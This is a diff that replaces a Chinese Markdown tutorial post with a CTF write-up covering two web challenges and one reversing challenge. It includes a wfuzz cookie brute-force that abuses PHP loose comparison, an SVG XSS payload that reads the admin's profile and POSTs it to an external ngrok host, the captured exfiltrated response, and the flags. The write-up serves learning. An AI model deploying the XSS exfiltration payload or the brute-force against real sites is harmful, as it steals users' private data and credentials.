@@ -1,638 +1,240 @@
 ---
 layout: post
-title: 一份简明的 Markdown 笔记与教程
-categories: Markdown
-description: 一份简明的 Markdown 笔记与教程
-keywords: Markdown, VSCode
+title: CONFidence CTF 2019 writeups - My admin panel, Elementary, Web 50
+categories: CTF
+description: CTF writeup
+keywords: CTF, web, reversing
 ---
 
-为部门内知识分享准备的素材，记录了 Markdown 的优点、应用场景和编辑工具，介绍了标准语法与扩展语法，以及一些应用 Markdown 的奇技淫巧。个人使用 Markdown 的经验持续补充中，最新完整版请参见
-
-<https://github.com/mzlogin/markdown-intro>
+最近因為工作需求要做PT，開始接觸到比較多web exploit，而我在這方面實在是很弱很弱，於是找了CTF來練練web題，這次總共做了兩題web和一題reversing。
 
 ---
 
-自从 2014 年左右接触到 Markdown 以来，对它的使用就一发而不可收拾。从最开始使用它在 GitHub Pages 里写博客，到用它编辑项目的 README 文件，再到撰写开发文档，编辑微信公众号文章和邮件内容等等，这期间也见证了它在各类平台和网站上的普及和被原生支持，可以说，Markdown 如今已经渗透了我在技术和网络活动的方方面面，成为了我撰写文本文档的首选。
+## My admin panel - [web 51p]
 
-那么首先我们一起来看一下它的「定义」：
+題目給了source code
+```php
+<?php
 
-> Markdown 是一种轻量级标记语言，创始人为 John Gruber。它允许人们「使用易读易写的纯文本格式编写文档，然后转换成有效的 XHTML（或者 HTML）文档」。——维基百科
+include '../func.php';
+include '../config.php';
 
-本文档的目的不在于面面俱到地介绍 Markdown，只是作为我对其理解的笔记整理，希望能同时帮助一些对 Markdown 感兴趣的人快速上手，或是作为一个工具，供对其已经有所了解的人在需要时参考。
-
-接下来请随我一起深入了解这门并不神秘的实用标记语言。
-
-**目录**
-
-* TOC
-{:toc}
-
-## 背景
-
-### 优点
-
-1. 专注于文字内容；
-
-2. 纯文本，易读易写，可以方便地纳入版本控制；
-
-3. 语法简单，没有什么学习成本，能轻松在码字的同时做出美观大方的排版。
-
-### 使用场景
-
-* 各类代码托管平台
-
-    主流的代码托管平台，如 GitHub、GitLab、BitBucket、Coding、Gitee 等等，都支持 Markdown 语法，很多开源项目的 README、开发文档、帮助文档、Wiki 等都用 Markdown 写作。
-
-* 技术社区和写作平台
-
-    StackOverflow、CSDN、掘金、简书、GitBook、有道云笔记
-
-* 论坛
-
-    V2EX、光谷社区
-
-个人感觉比较遗憾的一点是各平台可能采用不同语言实现的 Markdown 解析引擎，或采用同一解析引擎的不同版本，而且可能有不同程度的定制与扩展，这导致在不同平台上使用 Markdown 写作时体验并不完全一致。不过幸好对于大家公认的一些标准语法，各家都是支持的。
-
-### 编辑工具
-
-理论上任何一款文本编辑器都能用于编辑 Markdown 文档，它们分别提供了不同程度的语法高亮、预览等功能，以下只是列举其中一部分，选择自己称手的即可。
-
-* 现代编辑器
-
-    VSCode / Atom
-
-* 传统编辑器
-
-    Vim / Emacs / Sublime Text / Notepad++
-
-* IDE 自带编辑器
-
-    IntelliJ IDEA / Android Studio / WebStorm
-
-* 专用编辑器
-
-    Ulysses / Mou / Typora / Markpad
-
-* 在线编辑器
-
-    各种支持 Markdown 的网站都提供了在线编辑器
-
-## 语法
-
-### 标题
-
-**Markdown：**
-
-```
-# atx-style 一级标题
-
-## 二级标题
-
-###### 六级标题
-
-Setext-style 一级标题
-===
-
-二级标题
----
-```
-
-**预览效果：**
-
-> # atx-style 一级标题
-> 
-> ## 二级标题
-> 
-> ###### 六级标题
->
-> Setext-style 一级标题
-> ===
->
-> 二级标题
-> ---
-
-**对应 HTML：**
-
-```html
-<h1>atx-style 一级标题</h1>
-
-<h2>二级标题</h2>
-
-<h6>六级标题</h6>
-
-<h1>Setext-style 一级标题</h1>
-
-<h2>二级标题</h2>
-```
-
-### 段落
-
-中间没有空行的连续不断的几行文字被视为一个段落。
-
-**Markdown：**
-
-```
-白日依山尽，
-
-黄河入海流。
-（句号后面没空格）
-
-欲穷千里目，
-
-更上一层楼。  
-（句号后面有俩空格）
-```
-
-**预览效果：**
-
-白日依山尽，
-
-黄河入海流。
-（句号后面没空格）
-
-欲穷千里目，
-
-更上一层楼。  
-（句号后面有俩空格）
-
-**对应 HTML：**
-
-```html
-<p>白日依山尽，</p>
-
-<p>黄河入海流。
-（句号后面没有空格）</p>
-
-<p>欲穷千里目，</p>
-
-<p>
-  更上一层楼。
-  <br>
-  （句号后面有俩空格）
-</p>
-```
-
-### 行内格式
-
-对段落或者部分文本的强调效果。
-
-**Markdown：**
-
-```
-后面俩字**加黑**
-
-后面俩字*斜体*
-```
-
-**预览效果：**
-
-后面俩字**加黑**
-
-后面俩字*斜体*
-
-**对应 HTML：**
-
-```html
-<p>
-  后面俩字
-  <strong>加黑</strong>
-</p>
-<p>
-  后面俩字
-  <em>斜体</em>
-</p>
-```
-
-### 引用块
-
-**Markdown：**
-
-```
-> 引用块段落一。
->
-> 引用块段落二。
->> 内嵌引用块段落一。
->
-> ### 引用块内的标题
-```
-
-**预览效果：**
-
-> 引用块段落一。
->
-> 引用块段落二。
->
-> > 内嵌引用块段落一。
->
-> ### 引用块内的标题
-
-**对应 HTML：**
-
-```html
-<blockquote>
-  <p>引用块段落一。</p>
-  <p>引用块段落二。</p>
-  <blockquote>
-    <p>内嵌引用块段落一。</p>
-  </blockquote>
-  <h3 id="引用块内的标题">引用块内的标题</h3>
-</blockquote>
-```
-
-### 超链接
-
-Markdown 支持行内式链接和引用式链接。
-
-**Markdown：**
-
-```
-行内式 [博客](https://mazhuang.org "我的个人博客") 链接，带 title。
-
-行内式 [GitHub](https://github.com/mzlogin) 链接。
-
-引用式 [博客][1] 链接。
-
-引用式 [GitHub][2] 链接，带 title。
-
-[1]: https://mazhuang.org
-[2]: https://github.com/mzlogin "我的 GitHub 主页"
-```
-
-**预览效果：**
-
-行内式 [博客](https://mazhuang.org "我的个人博客") 链接，带 title。
-
-行内式 [GitHub](https://github.com/mzlogin) 链接。
-
-引用式 [博客][1] 链接。
-
-引用式 [GitHub][2] 链接，带 title。
-
-[1]: https://mazhuang.org
-[2]: https://github.com/mzlogin "我的 GitHub 主页"
-
-**对应 HTML：**
-
-```html
-<p>行内式 <a href="https://mazhuang.org" title="我的个人博客">博客</a> 链接，带 title。</p>
-
-<p>行内式 <a href="https://github.com/mzlogin">GitHub</a> 链接。</p>
-
-<p>引用式 <a href="https://mazhuang.org">博客</a> 链接。</p>
-
-<p>引用式 <a href="https://github.com/mzlogin" title="我的 GitHub 主页">GitHub</a> 链接，带 title。</p>
-```
-
-### 图片
-
-在超链接的写法前加一个 `!`，就是引用图片的方法。
-
-**Markdown：**
-
-```
-![Alt text](https://mazhuang.org/favicon.ico "favicon")
-```
-
-**预览效果：**
-
-![Alt text](https://mazhuang.org/favicon.ico "favicon")
-
-**对应 HTML：**
-
-```html
-<img src="https://mazhuang.org/favicon.ico" alt="Alt text" title="favicon">
-```
-
-### 列表
-
-包括有序列表和无序列表。
-
-**Markdown：**
-
-```
-- 苹果
-- 葡萄
-- 榴莲
-
-1. 苹果
-2. 葡萄
-3. 榴莲
-```
-
-**预览效果：**
-
-- 苹果
-- 葡萄
-- 榴莲
-
-1. 苹果
-2. 葡萄
-3. 榴莲
-
-**对应 HTML：**
-
-```html
-<ul>
-  <li>苹果</li>
-  <li>葡萄</li>
-  <li>榴莲</li>
-</ul>
-<ol>
-  <li>苹果</li>
-  <li>葡萄</li>
-  <li>榴莲</li>
-</ol>
-```
-
-其中无序列表的标记可以使用 `+`、`-` 或 `*`，有序列表前的数字可以是乱序的。
-
-### 代码块
-
-支持行内代码和代码块。
-
-**Markdown：**
-
-    Android 里使用 `TextUtils` 类的 `isEmpty` 方法来判断字符串是否为空。
-
-    ```java
-    if (TextUtils.isEmpty(text)) {
-        return null;
-    }
-    ```
-
-**预览效果：**
-
-Android 里使用 `TextUtils` 类的 `isEmpty` 方法来判断字符串是否为空。
-
-```java
-if (TextUtils.isEmpty(text)) {
-    return null;
+if (!$_COOKIE['otadmin']) {
+    exit("Not authenticated.\n");
 }
+
+if (!preg_match('/^{"hash": [0-9A-Z\"]+}$/', $_COOKIE['otadmin'])) {
+    echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n";
+    exit();
+}
+
+$session_data = json_decode($_COOKIE['otadmin'], true);
+
+if ($session_data === NULL) { echo "COOKIE TAMPERING xD IM A SECURITY EXPERT\n"; exit(); }
+
+if ($session_data['hash'] != strtoupper(MD5($cfg_pass))) {
+    echo("I CAN EVEN GIVE YOU A HINT XD \n");
+
+    for ($i = 0; i < strlen(MD5('xDdddddd')); i++) {
+        echo(ord(MD5($cfg_pass)[$i]) & 0xC0);
+    }
+
+    exit("\n");
+}
+
+display_admin();
+```
+   
+一個簡單的php code，檢查cookie `otadmin`是否符合`{"hash": ...}`的格式，如果符合，再跟某個secret值檢查相等，其實想了一下就知道不可能破出來，一定是找其他問題點，瀏覽一下可看到關鍵的一行：
+```
+if ($session_data['hash'] != strtoupper(MD5($cfg_pass)))
+```
+用的是`==`而不是`===`，牽扯到string比對用`==`那肯定得出問題的，例如
+```php
+0 == "aa" 
+0 != "1"  
+0 != "1a"  
+0 == "a1"
+1 == "1a"
+```
+以上得到的全都是**true**！總而言之string頭有數字就會被當數字。  
+
+另外如果false時會噴hint
+> I CAN EVEN GIVE YOU A HINT XD
+> 0006464640640064000646464640006400640640646400
+回去看一下code，會發現這個output來自於`secret[i] & 0xc0`，加上這個secret是某個MD5 hash，所以只能是英文和數字，output是**0**的是`0-9`，而output是**64**的是`a-zA-Z`，所以能得出一個結論－**secret的前三byte是數字**。
+
+再結合`==`的特性，只要**brute-force三位數數字**就能解了。
+  
+```sh
+wfuzz -b otadmin="{\"hash\": FUZZ}" --hh=78 -c -z range,0-999 https://gameserver.zajebistyc.tf/admin/login.php
 ```
 
-**对应 HTML：**
-
-```html
-<p>Android 里使用 <code>TextUtils</code> 类的 <code>isEmpty</code> 方法来判断字符串是否为空。</p>
-
-<div class="highlight highlight-source-java"><pre><span class="pl-k">if</span> (<span class="pl-smi">TextUtils</span><span class="pl-k">.</span>isEmpty(text)) {
-    <span class="pl-k">return</span> <span class="pl-c1">null</span>;
-}</pre></div>
-```
-
-上例中的语言标记 `java` 可选填，可用于在编辑器和渲染后的效果里添加语法高亮。
-
-块式代码也可以对整个代码段缩进四个空格，或一个 Tab 来实现。
-
-### 水平分割线
-
-使用一个单独行里的三个或以上 `*`、`-` 来生产一条水平分割线，它们之间可以有空格。
-
-**Markdown：**
-
-```
-***
-
------
-
-- - -
-```
-
-**预览效果：**
-
-***
-
------
-
-- - -
-
-**对应 HTML：**
-
-```
-<hr />
-
-<hr />
-
-<hr />
-```
-
-### 嵌入 HTML
-
-Markdown 标记语言的目的不是替代 HTML，也不是发明一种更便捷的插入 HTML 标签的方式。它对应的只是 HTML 标签的一个很小的子集。
-
-对于那些没有办法用 Markdown 语法来对应的 HTML 标签，直接使用 HTML 来写就好了。
-
-## 扩展语法
-
-本节的内容是介绍一些受到广泛支持的 Markdown 扩展语法。
-
-### 表格
-
-**Markdown：**
-
-    | 编号  | 姓名（左） | 年龄（右） | 性别（中） |
-    | ----- | :--------  | ---------: | :------:   |
-    | 0     | 张三       | 28         | 男         |
-    | 1     | 李四       | 29         | 男         |
-
-**预览效果：**
-
-| 编号  | 姓名（左） | 年龄（右） | 性别（中） |
-| ----- | :--------  | ---------: | :------:   |
-| 0     | 张三       | 28         | 男         |
-| 1     | 李四       | 29         | 男         |
-
-**对应 HTML：**
-
-```html
-<table>
-  <thead>
-    <tr>
-      <th>编号</th>
-      <th align="left">姓名（左）</th>
-      <th align="right">年龄（右）</th>
-      <th align="center">性别（中）</th>
-    </tr>
-  </thead>
-  <tbody>
-    <tr>
-      <td>0</td>
-      <td align="left">张三</td>
-      <td align="right">28</td>
-      <td align="center">男</td>
-    </tr>
-    <tr>
-      <td>1</td>
-      <td align="left">李四</td>
-      <td align="right">29</td>
-      <td align="center">男</td>
-    </tr>
-  </tbody>
-</table>
-```
-
-### 任务列表
-
-在 GitHub / GitLab 里有较好的支持。
-
-**Markdown：**
-
-```
-- [x] 洗碗
-- [ ] 清洗油烟机
-- [ ] 拖地
-```
-
-**预览效果：**
-
-- [x] 洗碗
-- [ ] 清洗油烟机
-- [ ] 拖地
-
-**对应 HTML：**
-
-```html
-<ul class="contains-task-list">
-  <li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox" checked=""> 洗碗</li>
-  <li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox"> 清洗油烟机</li>
-  <li class="task-list-item"><input type="checkbox" id="" disabled="" class="task-list-item-checkbox"> 拖地</li>
-</ul>
-```
-
-如果是在 GitHub / GitLab 的 Issue 里，会附赠任务完成比例提示效果：
-
-![task list 1](https://raw.githubusercontent.com/mzlogin/markdown-intro/master/assets/task-list-1.png)
-
-还可以直接在网页上拖动调整顺序，勾选和取消勾选。
-
-![task list 2](https://raw.githubusercontent.com/mzlogin/markdown-intro/master/assets/task-list-2.png)
-
-### 删除线
-
-**Markdown：**
-
-```
-后面三个字打上~~删除线~~。
-```
-
-**预览效果：**
-
-后面三个字打上~~删除线~~。
-
-**对应 HTML：**
-
-```html
-<p>后面三个字打上<del>删除线</del>。</p>
-```
-
-### 自动链接
-
-自动链接扩展，即：当识别到 URL，或用 `<`、`>` 包括的 URL 时，会自动为其生成 `a` 标签。
-
-**Markdown：**
-
-```
-https://github.com
-
-<example@gmail.com>
-```
-
-**预览效果：**
-
-https://github.com
-
-<example@gmail.com>
-
-**对应 HTML：**
-
-```html
-<p><a href="https://github.com">https://github.com</a></p>
-
-<p><a href="mailto:example@gmail.com">example@gmail.com</a></p>
-```
-
-### emoji
-
-以 GitHub Pages 为例。
-
-**Markdown：**
-
-```
-:camel: :blush: :smile:
-```
-
-**预览效果：**
-
-:camel: :blush: :smile:
-
-**对应 HTML：**
-
-```html
-<p>
-  <img class="emoji" title=":camel:" alt=":camel:" src="https://assets-cdn.github.com/images/icons/emoji/unicode/1f42b.png" height="20" width="20">
-  <img class="emoji" title=":blush:" alt=":blush:" src="https://assets-cdn.github.com/images/icons/emoji/unicode/1f60a.png" height="20" width="20">
-  <img class="emoji" title=":smile:" alt=":smile:" src="https://assets-cdn.github.com/images/icons/emoji/unicode/1f604.png" height="20" width="20">
-</p>
-```
-
-## 奇技淫巧
-
-脑洞清奇的工程师们还发掘了很多使用 Markdown 的方法，大部分都是引入第三方 JavaScript 插件来实现。对这部分我只做简述，对其中的部分功能比如作图等，还是推荐用专门的可视化工具去做。
-
-### 画流程图和时序图
-
-有部分网站和编辑器实现了对 Markdown 里流程图和时序图的支持，比如我们使用的项目管理工具 TAPD 的在线编辑器，还有 VSCode + 插件 Markdown Preview Enhanced 等。
-
-以我们使用的项目管理工具 TAPD 的在线编辑器为例：
-
-![流程图](https://raw.githubusercontent.com/mzlogin/markdown-intro/master/assets/tapd-markdown-flowchart.png)
-
-![时序图](https://raw.githubusercontent.com/mzlogin/markdown-intro/master/assets/tapd-markdown-seq.png)
-
-### 插入数学公式
-
-仍然以 TAPD 为例：
-
-![数学公式](https://raw.githubusercontent.com/mzlogin/markdown-intro/master/assets/tapd-markdown-math.png)
-
-应该是利用 JavaScript 支持了 LaTeX 公式语法。
-
-### 用 Markdown 做 PPT
-
-有专门的工具 [Marp](https://github.com/yhatt/marp)，另外使用 VSCode + 插件 Markdown Preview Enhanced 也可以实现。
-
-### 用 Markdown 写微信公众号
-
-可以将公众号素材用 Markdown 编辑好后，贴到在线排版工具以后，复制到公众号编辑器里即可。有多种页面主题和代码主题可选择。
-
-我维护的工具地址：<https://md.mazhuang.org>
-
-![微信公众号](https://raw.githubusercontent.com/mzlogin/markdown-intro/master/assets/wechat-markdown.png)
-
-### 更多
-
-想象力丰富的工程师们还扩展了很多基于 Markdown 的玩法，包括但不限于：
-
-* 自动生成 / 更新 Table of Contents
-* 流程图 / 时序图
-* 制作幻灯片
-* 集成 PlantUML / GraphViz 的能力
-* 导出 HTML / PDF / 电子书
-* ...
-
-以上功能基本都可以用 VSCode + 插件 Markdown Preview Enhanced 实现。
-
-另外可以参考我以前的一篇博客 [关于 Markdown 的一些奇技淫巧](https://mazhuang.org/2017/09/01/markdown-odd-skills/)。
-
-## 参考
-
-* [Markdown: Syntax - DARING FIREBALL](https://daringfireball.net/projects/markdown/syntax)
-* [Markdown - 维基百科](https://zh.wikipedia.org/wiki/Markdown)
-* [GitHub Flavored Markdown Spec](https://github.github.com/gfm/)
-* [关于 Markdown 的一些奇技淫巧](https://mazhuang.org/2017/09/01/markdown-odd-skills/)
+flag - `p4{wtf_php_comparisons_how_do_they_work}`
 
 ---
 
-欢迎关注我的微信公众号，接收 markdown-intro 最新动态。
+## Web 50 - [web 154p]
 
-<div align="center"><img width="192px" height="192px" src="https://mazhuang.org/assets/images/qrcode.jpg"/></div>
+網站有`profile`和`report`兩個page，其中`/report`可以傳一個URL給他，不過只能是同個domain底下的，page也講得很明白了：
+> admin will take a look, blah blah, you know what it means
+
+看來就是要偷admin的cookie之類的，不過看了一下是`httpOnly`，好像又不太行？
+
+再看一下`/profile`，可以填一些值和上傳圖片，上傳圖片會檢查header，不過我以為做一份header出來然後把
+payload塞在後面就可以，結果傳完之後的URL還是被當作圖片來解析(即使副檔名是php之類)，改`Content-Type`也沒用，到現在還是不知道為何...
+   
+最後想到了**SVG XSS**，傳了普通的SVG上去後發現OK，接著就開始來踹踹看XSS：
+(有圖片大小檢查要稍微注意)
+```javascript
+<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg"  width="100px" height="100px" xml:space="preserve">                              
+    <script>
+      alert(1);
+    </script>
+</svg>
+```
+成功觸發XSS!那麼接下來就要想想能怎麼利用這個XSS，在嘗試的過程發現可以拜訪其他人的profile(包括admin)，
+但`secret`是看不到的，於是就猜想這個`secret`應該就是flag，往這個方向繼續構造payload
+```javascript
+<?xml version="1.0" encoding="UTF-8"?> <svg xmlns="http://www.w3.org/2000/svg"  width="100px" height="100px" xml:space="preserve">                              
+    <script>
+        var xhr = new XMLHttpRequest();
+        xhr.onreadystatechange = function() {
+            if (xhr.readyState === 4) {
+                var xhr2 = new XMLHttpRequest();
+                xhr2.open("POST", "http://59d95a27.ngrok.io");
+                xhr2.send(xhr.responseText);
+            }
+        }
+        xhr.open("GET", "http://web50.zajebistyc.tf/profile/admin");
+        xhr.withCredentials = true;
+        xhr.send();
+    </script>
+</svg>
+```
+
+這邊使用了`ngrok`來expose local server，不得不嘲笑一下自己的網路知識...那時候一直在google `nc http echo web server`，結果問題是根本沒有public ip，鬼打牆了好久。
+  
+總結一下利用步驟：
+1. 使用`ngrok`取得對外server
+2. 觸發admin端去GET自己的profile
+3. 把content丟給server
+4. server forward給localhost(nc之類的)
+
+```html
+POST / HTTP/1.1
+Host: 59d95a27.ngrok.io
+Content-Length: 1808
+Origin: http://web50.zajebistyc.tf
+User-Agent: Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) HeadlessChrome/72.0.3626.122 Safari/537.36
+Content-Type: text/plain;charset=UTF-8
+Accept: */*
+Referer: http://web50.zajebistyc.tf/avatar/688787d8ff144c502c7f5cffaafe2cc588d86079f9de88304c26b0cb99ce91c6/payload.svg
+Accept-Encoding: gzip, deflate
+X-Forwarded-For: 37.187.92.182
+
+Hi admin
+<img src="//avatar/default/duck.png" style="max-width: 100px; max-height: 100px">
+<form method="POST" enctype="multipart/form-data">
+    <div>
+        Firstname:
+    <input type="text" name="firstname" value="Janusz">
+    </div>
+    <div>
+        Lastname:
+    <input type="text" name="lastname" value="Nosacz">
+    </div>
+    <div>
+        Shoesize:
+    <select name="shoesize" value=40>
+        <option value="30">30</option>
+        <option value="31">31</option>
+        <option value="32">32</option>
+        <option value="33">33</option>
+        <option value="34">34</option>
+        <option value="35">35</option>
+        <option value="36">36</option>
+        <option value="37">37</option>
+        <option value="38">38</option>
+        <option value="39">39</option>
+        <option value="40">40</option>
+        <option value="41">41</option>
+        <option value="42">42</option>
+        <option value="43">43</option>
+        <option value="44">44</option>
+        <option value="45">45</option>
+        <option value="46">46</option>
+        <option value="47">47</option>
+        <option value="48">48</option>
+        <option value="49">49</option>
+        <option value="50">50</option>
+        <option value="51">51</option>
+        <option value="52">52</option>
+        <option value="53">53</option>
+        <option value="54">54</option>
+        <option value="55">55</option>
+        <option value="56">56</option>
+        <option value="57">57</option>
+        <option value="58">58</option>
+        <option value="59">59</option>
+    </select>
+    </div>
+    <div>
+        Secret:
+    <input type="text" name="secret" value="p4{15_1t_1m4g3_or_n0t?}">
+    </div>
+    <div>
+        Avatar:
+    <input type="file" name="avatar">
+    </div>
+    <input type="submit">
+</form>
+```
+
+成功得到admin's secret!
+
+flag : `p4{15_1t_1m4g3_or_n0t?}`
+
+### Ref. writeups
+* [use Burp Collaborator](https://github.com/HalfFlag/ctf-writeups/tree/master/web/teaser-confidence-2019_web-50)
+* [cache poison](https://ctftime.org/writeup/13925)
+
+---
+
+## Elementary - [reversing 57p]
+相對Web來說Reversing還是比較擅長的，原來想利用這題來練習Ghidra，沒想到Ghidra decompile出來的東西超醜...(一堆nested if)，相比IDA全都是one layer if statement，於是索性寫個IDApy來解了。
+
+```python
+import re
+funcs = []
+for x in idautils.Functions():
+        fn = get_func_name(x)
+        if fn.find('function') != -1:
+                de = int(str(idaapi.decompile(x)).find('^')!=-1)
+                funcs.append([fn, x, de])
+                
+checkFlag_addr = 0xCEB7C
+de = str(idaapi.decompile(checkFlag_addr)).split('function')[1:]
+
+flag = [0]*1000
+
+for code in de:
+        idx = re.search('a1 \+ ([0-9]+)', code)
+        idx = 0 if not idx else int(idx.group(1))
+        bit = re.search('>> ([0-9]+)', code)
+        bit = 0 if not bit else int(bit.group(1))
+
+        flag[idx] += funcs[ int(code.split('(')[0]) ][2] << bit
+
+flag=list(filter(lambda a: a != 0, flag))
+print('flag => ' + ''.join(list(map(chr, flag))))
+
+```
+
+flag : `p4{I_really_hope_you_automated_this_somehow_otherwise_it_might_be_a_bit_frustrating_to_do_this_manually}`
+
+---
+
+## Ref.
+* [How to expose a local development server to the Internet](https://medium.com/botfuel/how-to-expose-a-local-development-server-to-the-internet-c31532d741cc)
+* [測試 webhook 不再煩惱：ngrok](https://blog.techbridge.cc/2018/05/24/ngrok/)
